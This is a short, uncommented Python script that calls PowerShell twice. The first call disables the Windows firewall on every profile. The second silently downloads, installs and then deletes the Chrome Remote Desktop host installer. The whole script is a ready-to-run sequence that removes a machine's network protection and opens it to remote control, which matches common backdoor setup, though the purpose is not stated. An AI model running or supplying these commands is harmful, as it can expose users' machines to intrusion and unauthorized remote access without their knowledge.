import subprocess
process=subprocess.Popen(["powershell.exe","Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"])

process=subprocess.Popen(["powershell.exe","& {$P = $env:TEMP + '\chromeremotedesktophost.msi'; Invoke-WebRequest 'https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi' -OutFile $P; Start-Process $P -Wait; Remove-Item $P}"])
